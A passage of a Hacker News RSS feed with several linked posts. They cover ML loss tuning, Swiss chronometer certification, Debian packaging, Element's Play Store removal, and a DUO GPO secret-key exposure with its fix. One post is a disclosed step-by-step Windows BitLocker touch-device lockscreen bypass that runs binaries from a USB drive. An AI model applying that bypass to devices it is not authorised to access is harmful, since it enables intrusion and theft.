                                        <div><h2 id="why-are-machine-learning-algorithms-hard-to-tune">Why are machine learning algorithms hard to tune?</h2><p>In machine learning, linear combinations of losses are all over the place. In fact, they are commonly used as the standard approach, despite that they are a perilous area full of dicey pitfalls. Especially regarding how these linear combinations make your algorithm hard to tune.</p><p>Therefore, in this post we hope to lay out the following arguments:</p><ul><li>A lot of problems in machine learning should be treated as multi-objective problems, while they currently are not.</li><li>This lack of multi-objective treatment leads to difficulties in tuning the hyper-parameters for these machine learning algorithms.</li><li>It is nigh on impossible to detect when these problems are occurring, making it tricky to work around them.</li><li>There are methods to solve this which might be slightly involved, but do not require more than a few lines of code. <a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">One of these methods is laid out in a follow-up blog post.</a></li></ul><p>Nothing of this article is novel. You might already be aware of everything we wanted to say. However, we have the impression that most machine learning curricula do not discuss optimisation methods very well (I know mine did not), and consequently, gradient descent is being treated as the one method to solve all problems. And the general message is that if an algorithm does not work for your problem, you need to spend more time tuning the hyper-parameters to your problem. </p><p><a href="https://engraved.ghost.io/how-we-can-make-machine-learning-algorithms-tunable">In the next blog post, a solution is introduced</a>, based on the NIPS’88 paper which introduced the Modified Differential Method of Multipliers.</p><p>So we hope that this blogpost can remove some confusion on how to handle this issue in a more foundational and principled way. And hey, maybe it can make you spend less time tuning your algorithms, and more time making research progress.</p><h2 id="linear-combinations-of-losses-are-everywhere">Linear combinations of losses are everywhere</h2><p>While there are single-objective problems, it is common for these objectives to be given additional regularisation. We have picked a selection of such optimisation objectives from across the field of machine learning field.</p><p>First off, we have the regularisers, weight decay and lasso. It is obvious that when you add these regularisations, you effectively have created a multi-objective loss for your problem. After all, what you really care about, is that both the original loss \(L_0\) and the regulariser loss are kept low. And you will tune the balance between the two using a \(\lambda\) parameter.</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \left| \theta \right| $$</p><p>$$ L(\theta) = L_0(\theta) + \lambda \sum \theta^2 $$</p><p>As a consequence, losses found in e.g. VAE’s are effectively multi-objective, with a first objective to maximally cover the data, and a second objective to stay close to the prior distribution. In this case, occasionally KL annealing is used to introduce a tunable parameter \(\beta\) to help handle the multi-objectiveness of this loss.</p><p>$$ L(\theta) =\mathbb{E}_{q_{\phi}(z | x )} \left[ \log p_\theta ( x | z) \right] &nbsp;- \beta D_{KL} \left( q_\phi ( z | x) \| p(z) \right) $$</p><p>Also in reinforcement learning, you can see this multi-objectiveness. Not only is it common for many environments to simply sum rewards received for obtaining partial goals. The policy loss is usually also a linear combination of losses. Take as an example here the losses on the policy for PPO, SAC and MPO, entropy regularized methods with their tunable parameter <strong><em>α</em></strong>.</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ r(s_t, a_t) + \alpha \mathcal{H}(\cdot , s_t)\right]$$</p><p>$$ L(\pi) = - \sum_t \mathbb{E}_{(s_t, a_t)} \left[ \mathbb{E}_\pi\left(Q(s_t, a_t)\right) - \alpha D_{KL} \left( q \| \pi \right) \right]$$</p><p>Finally, the GAN-loss is of course a sum between the discriminator and the generator loss:</p><p>$$ L(\theta) = - \mathbb{E}_x \left[ \log D_\theta(x)\right] - \mathbb{E}_z \left[ \log ( 1- D_\theta(G_\theta(z))\right]$$</p><p>All of these losses have something in common, they are effectively trying to optimise for multiple objectives simultaneously, and argue that the optimum is found in balancing these often contradicting forces. In some cases, the sum is more ad hoc and a hyper-parameter is introduced to weigh the parts against each other. In some cases, there are clear theoretical foundations on why the losses are combined this way, and no hyper-parameter is used for tuning the balance between the parts. </p><blockquote>In this post, we hope to show you this approach of combining losses may sound appealing, but that this linear combination is actually precarious and treacherous. The balancing act is often more like a tightrope walk.</blockquote><p>Let us consider a simple case, where we are trying to optimise for such a linear combination of losses. We take the approach of optimising the total loss, which is a sum of losses. We optimise this with gradient descent, and we observe the following behaviour.</p><figure><img src="https://lh5.googleusercontent.com/953U2daXgDAO_97ugiYVEKnbK69gZVKUmlY9hNpCqtYlTso-XFw8WQ-dWRcBNeNtx7KNvXi1bM5mB8cfmnjXUMg4gU6fp5LvADys1WtoWIW-mqiJt1Uzu-Lw8VceNfQeLLQa9IZa" alt=""></figure><p>Our code in Jax would look something like this:</p><pre><code>def loss(θ):
  return loss_1(θ) + loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ)
  θ = θ - 0.02 * gradient</code></pre><p>As is usually the case, we are not immediately happy about the tradeoff between the two losses. So we introduce a scaling coefficient <strong><em>α</em></strong> on the second loss and run the following code:</p><pre><code>def loss(θ, α):
  return loss_1(θ) + α*loss_2(θ)
loss_derivative = grad(loss)
for gradient_step in range(200):
  gradient = loss_derivative(θ, α=0.5)
  θ = θ - 0.02 * gradient
</code></pre><p>The behaviour we hope to see is that when tuning this <strong><em>α</em></strong>, we can choose the trade-off between the two losses and select the point we are most happy with for our application. We effectively will go on a hyper-parameter tuning loop, manually select an <strong><em>α</em></strong>, run the optimisation process, decide we would like the second loss to be lower, tune our <strong><em>α</em></strong> up accordingly and repeat the whole optimisation process. After several iterations, we settle for the solution we found and continue writing our papers.</p><p>However, that is not what is always happening. The actual behaviour we sometimes observe for our problem looks like the one below.</p><figure><img src="https://lh6.googleusercontent.com/iZlk4MRVx7JYgLbaqIv-jH8zZGSc78Jj-aqk_YWy5e80tf_hgMMaBn41yRFR2rpRFGE8vuRGWjljGZ6Ri8XbyDhZbAQbSCX-putykGEpxgmcuPTmrQH1VHKpaKfjra3AG4u-x9K7" alt=""></figure><blockquote>It seems that no matter how we finetune our <strong><em>α</em></strong>-parameter, we cannot make a good trade-off between our two losses. </blockquote><p>We see two clusters of solutions, one where the first loss is ignored, and one where the second loss is ignored. However, both of these solutions are not useful for most applications. Most of the time, a point where the two losses were more balanced is a more preferred solution.</p><p>In fact, this diagram of the two losses over the course of training is barely ever plotted, so the dynamics illustrated in this figure often goes unobserved. We just look at the training curve plotting the total loss, and we might conclude that this hyper-parameter needs more time tuning, as it seems to be really sensitive. Alternatively, we could settle for an approach of early stopping to make the numbers in the paper work. After all, reviewers love data efficiency.</p><p>Where did it go wrong though? <strong>Why does this method sometimes work, and why does it sometimes fail to give you a tunable parameter?</strong> For that, we need to look deeper into the difference between the two figures.</p><p>Both figures are generated for the same problem, using the same losses and are optimising these losses using the same optimisation method. So none of these aspects are to blame for the difference. The thing which has changed between these problems is the model. In other words, the effect the model parameters <strong><em>θ</em></strong> have on the output of the model is different.</p><p>Therefore, let us <em>cheat</em> and visualise something which is normally not visualisable, the Pareto front for both of our optimisations. This is the set of all solutions achievable by our model, which are not dominated by any other solution. In other words, it is the set of achievable losses, where there is no point where <em>all</em> of the losses are better. No matter how you choose to trade off between the two losses, your preferred solution always lies on the Pareto front. By tuning the hyper-parameter of your loss, you usually hope to merely find a different point on that same front.</p><figure><img src="https://lh6.googleusercontent.com/6qA_NcRMUK8mWT3j3-t_bPl-oZkwg5Q9lWcOgBn9IB3qF_yQ7p1dyH6eq_DtKpTGeACMsLE-YfiIY9DH3yhF7swsmMFGMjNwI_oHdKKbNTuO0M8a_oDZQTUhKGcEuAfTpomqHX-M" alt=""></figure><figure><img src="https://lh6.googleusercontent.com/kVqsudO8-j48MEsdlaZgDgc22jMO9myzwdbTTWQ-KufWjuXqIr9gNHKrgV-fRzTb5gMgDnO-sFp1z_lS3UhX3wjwXHRowiaO7Vp04ZaYEAthw7y6wyN3zltH3o0wgB5ZbTDjRuRb" alt=""></figure><p>The difference between the two Pareto fronts is what is causing the tuning to turn out well for the first case, but to fail horribly after changing our model. It turns out that when the Pareto front is convex, we can achieve all possible trade-offs by tuning our <strong><em>α</em></strong>-parameter. However, when the Pareto front is concave, that approach does not seem to work well anymore.</p><h2 id="why-does-gradient-descent-optimisation-fail-for-concave-pareto-fronts">Why does gradient descent optimisation fail for concave Pareto fronts?</h2><p>We can illustrate why that is the case, by looking at the total loss in the third dimension, the loss which is actually optimised with gradient descent. In the following figure, we visualise the plane of total loss in relation to each of the losses. While we actually descend on this plane using the gradient with respect to the parameters, each gradient descent step we take will also necessarily go downwards on this plane. You can imagine the gradient descent optimisation process as putting a spherical pebble on that plane, letting it wobble down under gravity and wait until it comes to a halt.</p><p>The point where the optimisation process halts is the result of the optimisation process, here indicated by a star. As you can see in the following figure, no matter how you wobble down the plane, you will always end up in the optimum.</p><figure><img src="https://lh4.googleusercontent.com/U43_rJCiufKMSZ4gtci5kTQ2DRIH_r8WyvFi0aFV0wjpxXTNSFnMzR8a9DHvBc_ONbi0rEIBfXRQXUSxAcriZDGBNWVRhMQ-ifaIXdgeNf1K6cEIeXzMjYZUk94EWMH_bOBzvhOa" alt=""></figure><p>By tuning <strong><em>α</em></strong>, this space stays a plane. After all, by changing <strong><em>α</em></strong>, we are only changing the tilt of this plane. As you can see, &nbsp;in the convex case any solution on the Pareto curve can be achieved by tuning <strong><em>α</em></strong>. A little more <strong><em>α</em></strong> pulls the star to the left, a little less <strong><em>α</em></strong> pushes the star to the right. Every starting point of the optimisation process will converge on the same solution, and that is true for all values of <strong><em>α</em></strong>.</p><figure><img src="https://engraved.ghost.io/content/images/2021/01/visualising_the_convex_case.mp4.hq.gif" alt=""></figure><p>However, if we take a look at the differently modeled problem with a concave Pareto front, it becomes apparent where …</p></div></section></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/">https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/</a></em></p>]]>
            </description>
            <link>https://engraved.ghost.io/why-machine-learning-algorithms-are-hard-to-tune/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969787</guid>
            <pubDate>Sat, 30 Jan 2021 15:24:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Contrôle Officiel Suisse des Chronomètres: agency certifying Swiss chronometers]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25969672">thread link</a>) | @Bluestein
<br/>
January 30, 2021 | https://www.cosc.swiss/en | <a href="https://web.archive.org/web/*/https://www.cosc.swiss/en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
        <!--[if lt IE 8]>
            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->

        <header>
            
            <a href="https://www.cosc.swiss/en/contact" id="btn-contact"><img src="https://www.cosc.swiss/sites/all/themes/cosc/img/icon-contact.svg">Contact</a>
        </header>

                
    

<section>
    								<header>
    <div id="slider-homepage">
        <div>
                                <article>
        <div>
            <h2>GUARANTOR OF TRADITIONAL PRECISION SWISS WATCHMAKING.</h2>
            <h3>      Reliability
</h3>
            <p>The official laboratories (OL) of the COSC verify some 1.8 million mechanical and quartz timekeeping instruments annually. The COSC is now the only organisation in the world able to handle such a volume of pieces. Each certified chronometer is unique, identified by a number engraved on its movement and a certificate number issued by the COSC.</p>


<!--            <p class="phase"><img src="/sites/default/files/" /></p>-->
        </div>
    </article>
                                <article>
        <div>
            <h2>Guarantor of traditional precision Swiss watchmaking.</h2>
            <h3>      The creation of the COSC
</h3>
            <p>Founded in 1973 and based in La Chaux-de-Fonds, the Official Swiss Chronometer Testing Institute (COSC) is a not-for-profit organisation recognised as serving the public interest, dedicated to Swiss watchmaking. Created by five watchmaking cantons (Bern, Geneva, Neuchâtel, Soleure and Vaud), as well as by the Federation of the Swiss Watch Industry (FH), it brings together a number of laboratories that were originally founded as independent institutions in the late 19th century.</p>


<!--            <p class="phase"><img src="/sites/default/files/" /></p>-->
        </div>
    </article>
                    </div>
    </div>
</header>		  
                        
    <div>
                    <article>
                      
<p>Its principal aim is to measure and verify the precision of the watch movements and finished watches entrusted to it by manufacturers, in order to award them the official certified chronometer title.</p>
<p>The COSC’s human resources and the capabilities of its various premises enable the organisation to respond to all requests from the Swiss watch industry in terms of certification and chronometric controls.</p>
<p>The certified "chronometer” title, certifying the high level of precision and uniqueness of timekeeping instruments, is a guarantee of extreme quality, as well as the know-how applied throughout the production process. In the marketplace, it offers added value that enables beneficiaries to stand out from their competitors.</p>
<p><a href="https://www.cosc.swiss/en/quality/swiss-made-controlled-label">Learn more</a></p>

 
            </article>
            <article>
                      
<p>The COSC tests are carried out with absolute rigour:</p>
<ul><li>The chronometric certification of wristwatches with a balance spring is based on 7 criteria set by the ISO 3159 standard, all of which must be fully met.</li>
<li>The chronometric certification of quartz watches, mechanical pocket watches or mechanical fixed timekeeping devices is based on internal requirements inspired by ISO 3159, but adapted to the specificities of the instruments.</li>
<li>Each piece examined daily for 14 to 20 days, depending on the type of instrument.</li>
<li>The certificate means that ALL the instruments entrusted to us are handled by agents of the COSC, a neutral and independent body.</li>
</ul><p>The figures show a boom in COSC activity, with certifications seeing a significant increase.</p>
<ul><li>200,000 certificates in 1976</li>
<li>1 million in 2000</li>
<li>between 1.6 and 1.8 million in recent years</li>
</ul><p>Proof of the very high value to which the COSC "chronometer" certificate attests: only about 6% of Swiss watches exported have this status. (Source: Federation of the Swiss Watch Industry FH).</p>

 
            </article>
            </div>   
</section>



    
        


 
        






        

        

    
</div>]]>
            </description>
            <link>https://www.cosc.swiss/en</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969672</guid>
            <pubDate>Sat, 30 Jan 2021 15:11:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BitLocker touch-device lockscreen bypass]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969397">thread link</a>) | @invokestatic
<br/>
January 30, 2021 | https://secret.club/2021/01/29/touch-lockscreen-bypass.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/29/touch-lockscreen-bypass.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>Microsoft has for the past years done a great job at hardening the Windows lockscreen, but after <a href="https://secret.club/author/jonas-l">Jonas</a> published <a href="https://secret.club/2021/01/15/bitlocker-bypass.html">CVE-2020-1398</a>, I put effort into weaponizing an old bug I had found in Windows Touch devices.</p><p>These exploits rely on the fundamental design of the Windows Lockscreen, where the instance that prompts the user for password runs with SYSTEM privileges. This means that even though most of the UI is blocked, you can always find a way to do some damage when there are options like “Reset password”</p><p><img src="https://secret.club/assets/touchbypass/1.jpg" alt=""></p><p>Clicking this button will result in a new user being created with the name of defaultuser1, defaultuser100000, defaultuser100001 (et cetera), and a new instance of <em>WWAHost</em> asking for user account credentials will be spawned. If everything is in order, it will ask you for a new pin, otherwise you will be stuck in this instance.</p><ul><li>Connect a physical keyboard</li><li>Enable the narrator</li><li>Select “I have forgotten my password.” and “Text &lt;phonenumber&gt;”</li><li>Change the size of the on-screen keyboard and open keyboard settings</li><li>Interact with the hidden settings window to execute our payload</li></ul><h2 id="constraints"> <a href="#constraints">Constraints</a></h2><p>To exploit this vulnerability, you will need:</p><ol><li>A surface touchscreen device. I used a surface book 2 15’ (Running up-to-date Windows 10 20H2 with BitLocker enabled)</li><li>A external keyboard</li><li>A flash drive containing your payload.</li></ol><h2 id="keyboard-confusion"> <a href="#keyboard-confusion">Keyboard confusion</a></h2><p>By connecting a external keyboard to our Surface device, we have the capability using both the on-screen and the physical keyboard. This is necessary to abuse certain functionality that allows us to bypass the lockscreen.</p><h2 id="narration"> <a href="#narration">Narration</a></h2><p>Windows includes various accessibility features such as narration. This functionality allows us to operate on hidden UI elements, as the narrator will read any selected element out loud, visible or not. Turn it on by clicking Windows+U and selecting “Enable narrator”</p><h2 id="i-forgot-my-password"> <a href="#i-forgot-my-password">I forgot my password</a></h2><p>A Forgotten password is one of the few cases you would ever do anything but login on the Windows lockscreen. The first part of our bypass requires you to select “I have forgotten my password.” on the login screen. This will open up a Microsoft Account login form, where you can choose to recover your password by texting a certain phone number. Selecting this opens up a text bar where you would normally type in the full recovery phone number, but in our case that is not the point. By opening this text bar, we can make the touch device display an on screen keyboard, which was the goal all along. With this software keyboard, you can change the size of the keyboard by hitting the options button in the top left, choose the largest keyboard available.</p><p><img src="https://secret.club/assets/touchbypass/2.png" alt=""></p><p>Now you should have a large software keyboard where you can open the settings menu:</p><p><img src="https://secret.club/assets/touchbypass/3.png" alt=""></p><p>After initialising the launch of keyboard settings, there is a small time frame where you can double click on this grey area here:</p><p><img src="https://secret.club/assets/touchbypass/4.jpg" alt=""></p><p>If you did this successfully, the narrator should explicitly say “Settings window”</p><h2 id="navigating-settings"> <a href="#navigating-settings">Navigating settings</a></h2><p>You wouldn’t think you could much with a hidden settings window on a locked Windows device, but you can actually navigate said window with a external keyboard. While holding down the Caps Lock key, the arrow keys and the tab key can be used to navigate UI elements.</p><p>One weaponization of this is going to <code>Autoplay</code> -&gt; <code>Removable drives</code> -&gt; <code>Open folder to view files</code>. This launches File Explorer, where you can execute windows binaries from a usb thumb-drive.</p><h2 id="disclosure"> <a href="#disclosure">Disclosure</a></h2><p>I reported the issue to MSRC, but they ignored the bug report citing a need of PoC, which I had already provided, they had also expressed disbelief towards the exploitability of this bug.</p><h2 id="demonstration"> <a href="#demonstration">Demonstration</a></h2><iframe width="560" height="315" src="https://www.youtube.com/embed/JAVRAeSJGwg" frameborder="0" allowfullscreen=""></iframe></div></div>]]>
            </description>
            <link>https://secret.club/2021/01/29/touch-lockscreen-bypass.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969397</guid>
            <pubDate>Sat, 30 Jan 2021 14:38:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Packaging of Lomiri Operating Environment for Debian (Part 04)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25969286">thread link</a>) | @pabs3
<br/>
January 30, 2021 | https://sunweavers.net/blog/node/128 | <a href="https://web.archive.org/web/*/https://sunweavers.net/blog/node/128">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>Before and during FOSDEM 2020, I agreed with the people (developers, supporters, managers) of the UBports Foundation to package the Unity8 Operating Environment for Debian. Since 27th Feb 2020, Unity8 has now become Lomiri.</p>

<p>Things got delayed a little recently as my main developer contact on the upstream side was on sick leave for a while. Fortunately, he has now fully recovered and work is getting back on track.</p>

<h3>Recent Uploads to Debian related to Lomiri</h3>

<p>Over the past 3 months I worked on the following bits and pieces regarding Lomiri in Debian:</p>

<ul>
<li>Work on DEB package qtmir.</li>
<li>Revisit upstream status of lomiri-ui-toolkit (and remind upstream on open issues to be resolved).</li>
<li>Debug googletest / cmake-extras build failures in qtmir DEB package.</li>
<li>Prepare MR!2 für cmake-extras upstream, upload cmake-extras 1.5-3 to Debian unstable.</li>
<li>Upload qtmir to unstable/NEW, submit patches upstream.</li>
<li>Upload to unstable as NEW: ayatana-indicator-bluetooth.</li>
<li>Upload to unstable: qtmir 0.6.1-2.</li>
<li>Upload to unstable: cmake-extras 1.5-5.</li>
<li>More debugging on googletest / cmake-extras.</li>
<li>Qt5.15 transition in Debian, various uploads.</li>
<li>Upload unstable: cmake-extras 1.5-6.</li>
<li>Debug and fix libqtdbustest / libqtdbusmock failures in Debian.</li>
<li>Get in touch with RAOF (on IRC, from the Mir Team) on possible fixes of Mir FTBFS in Debian (after a Mesa upload).</li>
<li>Upload to unstable: mir 1.8.0+dfsg1-11 (fix FTBFS).</li>
<li>Fix dbus-cpp autopkgtests.</li>
<li>Fix Mir FTBFS after Boost 1.74 transition.</li>
<li>Fix FTBFS in unit tests in lomiri-url-dispatcher.</li>
<li>Drop autopilot dependency from DEB package qtmir.</li>
<li>Heads-Up Meeting with Marius Gripsgard (discussion next steps).</li>
</ul>

<p>The next projects / packages ahead are lomiri-ui-toolkit, integrating changes required for Lomiri into Ayatana Indicators and then moving on with several other, smaller packages.</p>

<h3>Credits</h3>

<p>Many big thanks go to Marius and Dalton for their work on the UBports project and being always available for questions, feedback, etc.</p>

<p>Thanks to Florian Leeber for being my point of contact for topcis regarding my cooperation with the UBports Foundation.</p> </div></div>]]>
            </description>
            <link>https://sunweavers.net/blog/node/128</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969286</guid>
            <pubDate>Sat, 30 Jan 2021 14:23:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Element on Google Play Store]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969239">thread link</a>) | @todsacerdoti
<br/>
January 30, 2021 | https://element.io/blog/element-on-google-play-store/ | <a href="https://web.archive.org/web/*/https://element.io/blog/element-on-google-play-store/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      
      <div><p>Hi all,</p><p>At 2021-01-29 at 21:35 UTC Google suspended Element from the Play Store without warning or notification. &nbsp;We submitted an appeal asking for clarification at 23:18, and at 05:31 received a generic update from the Google Play Policy team citing that the app has been removed due to content which contravenes their terms of use, and asking us to “make the necessary changes to [our] app” and “upload a new app using a new package name and a new app name”.</p><p>As of 11:44 UTC we’ve submitted a detailed appeal to reiterate that Element is a generic chat app for connecting to the global Matrix communication network, just as Chrome is a generic web browser for connecting to the Web - and just as Google does not control the content on the Web, Element does not control the content on Matrix.</p><p>We have also explained that the Matrix servers that we <em>do</em> run as Element (including the default Matrix.org homeserver, which we run on behalf of <a href="https://matrix.org/foundation">The Matrix.org Foundation</a>) have <a href="https://matrix.org/legal/terms-and-conditions#6-play-nice-clauses">strict Terms of Use</a> which we actively enforce. We abhor abuse, and Element is not an app that caters to abusive content.</p><p>In order to enforce our terms of use on the Matrix servers we run as Element, we have a formal Trust and Safety team hired full-time who are dedicated to investigating and tracking abuse reports sent to <a href="https://element.io/cdn-cgi/l/email-protection#f09192858395b09d9184829988de9f8297"><span data-cfemail="a0c1c2d5d3c5e0cdc1d4d2c9d88ecfd2c7">[email&nbsp;protected]</span></a> or reported from the app. &nbsp;The team takes appropriate action on a ticket by ticket basis - deactivating abusive accounts and blocking chatrooms from our servers which contravene our terms of use, and building tooling to help enforce the terms of use on the servers we run.</p><p>Managing abuse is an ongoing activity, and <a href="https://sifted.eu/articles/element-whatsapp-exodus/">Matrix is expanding massively at the moment</a>. We are expanding Element’s Trust and Safety team to match that growth, focusing on improving our anti-abuse mechanisms, and we are also constantly expanding the <a href="https://matrix.org/docs/guides/moderation/">moderation tools</a> we provide to the community.</p><p>Meanwhile, we’re also continuing to work on decentralised reputation as a <a href="https://matrix.org/blog/2020/10/19/combating-abuse-in-matrix-without-backdoors/">scalable solution to empower other users to combat abuse</a> for the wider Matrix network - effectively bringing control back to users and empowering communities to remain safe online.</p><p>Element and Matrix are used by the French, German, UK and US governments, <a href="https://matrix.org/blog/2021/01/29/this-week-in-matrix-2021-01-29#dept-of-status-of-matrix-%EF%B8%8F">countless universities</a>, thousands of businesses and millions of people across the world - we can only apologise for the disruption caused by the app disappearing like this.</p><p>We’re currently waiting for an update to Google and will keep this blog post updated as the situation develops. &nbsp;We look forward to resolving the problem and getting the app back in the store shortly.</p><p>-- The Element Team</p><p>Update: reminder that in the interim you can download a (slightly outdated) version of Element Android from F-Droid at <a href="https://f-droid.org/en/packages/im.vector.app/">https://f-droid.org/en/packages/im.vector.app</a>. &nbsp;We're also looking into running our own F-Droid repository going forwards so the most recent build is always available there.</p><p>UPDATE: At 2021-01-30 23:17 UTC we received a call from a VP at Google who apologised for the bad communication from Google and explained the situation, which related to some extremely abusive content which was accessible on the default matrix.org homeserver. &nbsp;Our Trust and Safety team had already identified and acted on this content to enforce the server's terms of use, and so we've explained how Element and Matrix works, established a channel for communication over any future moderation concerns, and expect the app to be restored shortly.</p><p>UPDATE: The app is restored as of 2021-01-31 00:30 UTC. &nbsp;Huge thanks to everyone for your patience and support while we sorted this out, and to the wider Element team who spent their Saturday on this. &nbsp;Thanks also to Google for being transparent and apologetic and the rapid resolution once we'd established contact.</p></div>
      
    </div>
  </div></div>]]>
            </description>
            <link>https://element.io/blog/element-on-google-play-store/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969239</guid>
            <pubDate>Sat, 30 Jan 2021 14:16:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deploying DUO RDP through GPO can leave your Secret key exposed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25969193">thread link</a>) | @based2
<br/>
January 30, 2021 | https://www.amorales.org/2021/01/deploying-duo-rdp-through-gpo-can-leave.html | <a href="https://web.archive.org/web/*/https://www.amorales.org/2021/01/deploying-duo-rdp-through-gpo-can-leave.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-7307348735421866313">
<p>DUO RDP login has a convenient deployment mode where you can use GPOs to push out the Integration key, Secret key (SKEY), and API hostname settings. However, if you follow their documentation (as least today 2021-01-29) all authenticated users on the domain will be able to read the SKEY. This could allow attackers to <a href="https://www.bleepingcomputer.com/news/security/us-think-tank-breached-three-times-in-a-row-by-solarwinds-hackers/" target="_blank">generate the 2FA codes themselves</a>.&nbsp;</p><p>All users would be able to access the key through any of the steps below:</p><ul><li><span>Open GPMC<p><a href="https://1.bp.blogspot.com/-infWRYGtfe0/YBStYlgivFI/AAAAAAABRmQ/1fYLxxOtcBUU4NBX_RzUvwomBK8qvQzMwCLcBGAsYHQ/s1778/Untitled.png"><img data-original-height="708" data-original-width="1778" src="https://1.bp.blogspot.com/-infWRYGtfe0/YBStYlgivFI/AAAAAAABRmQ/1fYLxxOtcBUU4NBX_RzUvwomBK8qvQzMwCLcBGAsYHQ/s320/Untitled.png" width="320"></a></p><br></span></li><li>Pull the registry.pol file from the SYSVOL share<p><a href="https://1.bp.blogspot.com/-nLDuFHI2HNc/YBSukeKNRHI/AAAAAAABRmg/tj2T8t-mMOYXQ9bzoew3sXY1VCfvJQz3ACLcBGAsYHQ/s956/2.png"><img data-original-height="295" data-original-width="956" src="https://1.bp.blogspot.com/-nLDuFHI2HNc/YBSukeKNRHI/AAAAAAABRmg/tj2T8t-mMOYXQ9bzoew3sXY1VCfvJQz3ACLcBGAsYHQ/s320/2.png" width="320"></a></p><p><a href="https://1.bp.blogspot.com/-3ZQKGRlVTRQ/YBSuLw5pzkI/AAAAAAABRmY/58ojAPzq9Uw8cexTDwkPD7eyz4tYqPpqwCLcBGAsYHQ/s1468/2.png"><img data-original-height="261" data-original-width="1468" src="https://1.bp.blogspot.com/-3ZQKGRlVTRQ/YBSuLw5pzkI/AAAAAAABRmY/58ojAPzq9Uw8cexTDwkPD7eyz4tYqPpqwCLcBGAsYHQ/s320/2.png" width="320"></a></p></li></ul><p>I informed DUO of this issue and they will be updating their documentation.</p><h2>Remediation:</h2><p>If you intend to keep deploying the DUO settings through GPO then the steps below should keep the SKEY safe(r). Instead of allowing "Authenticated Users" to read the GPO, we will be restricting it to Domain Computers. This would still allow an attacker to read the SKEY GPO if they compromise a computer, but I don't think it's an issue since they would be able to pull it from the registry anyway.&nbsp;</p><p>Make the following changes on the DUO GPO:</p><div><ol><li>Remove Authenticated Users from the Delegation tab<p><a href="https://1.bp.blogspot.com/-RJb7zQFYOjA/YBSwweLKOUI/AAAAAAABRms/pqLPsMwrWeYxKkNbaQhc0fEHhhWPBLMJACLcBGAsYHQ/s931/3.png"><img data-original-height="575" data-original-width="931" src="https://1.bp.blogspot.com/-RJb7zQFYOjA/YBSwweLKOUI/AAAAAAABRms/pqLPsMwrWeYxKkNbaQhc0fEHhhWPBLMJACLcBGAsYHQ/s320/3.png" width="320"></a></p><br></li><li><div><p>Click Advanced and add Domain Computers and Domain Controllers (if you deploy DUO to them). Select "Apply Group Policy" on both.</p><p><a href="https://1.bp.blogspot.com/-hQzQADFAyuc/YBSxcMX-MAI/AAAAAAABRm0/CpUTHBaA7FQHy6tcCvKsFRQYoWausbhnACLcBGAsYHQ/s1605/4.png"><img data-original-height="824" data-original-width="1605" src="https://1.bp.blogspot.com/-hQzQADFAyuc/YBSxcMX-MAI/AAAAAAABRm0/CpUTHBaA7FQHy6tcCvKsFRQYoWausbhnACLcBGAsYHQ/s320/4.png" width="320"></a></p><br></div></li><li><div><p>If you did everything correctly your GPO should look like this:</p><p><a href="https://1.bp.blogspot.com/-_0Icr32bR70/YBSx3hEnt_I/AAAAAAABRnA/5FcYOEx5AI4PAWT5E98mFAx6eiMMT3P0wCLcBGAsYHQ/s845/4.png"><img data-original-height="645" data-original-width="845" src="https://1.bp.blogspot.com/-_0Icr32bR70/YBSx3hEnt_I/AAAAAAABRnA/5FcYOEx5AI4PAWT5E98mFAx6eiMMT3P0wCLcBGAsYHQ/s320/4.png" width="320"></a></p><br></div></li><li><p>Run a gpupdate on some computers and confirm that it's working as expected</p></li></ol><h2>Other notes:</h2><p>Make sure to follow the section "<a href="https://duo.com/docs/winlogon-gpo#securing-the-group-policy-registry-key" target="_blank">Securing the Group Policy Registry Key</a>" to protect the policy key while its in the registry.</p></div><p>Make sure to apply similar ACLs to the DUO MSI/MST files network share if you are using those to automatically push out the application.</p>
</div></div>]]>
            </description>
            <link>https://www.amorales.org/2021/01/deploying-duo-rdp-through-gpo-can-leave.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25969193</guid>
            <pubDate>Sat, 30 Jan 2021 14:11:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[December/January in KDE Itinerary]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25969183">thread link</a>) | @pabs3
<br/>
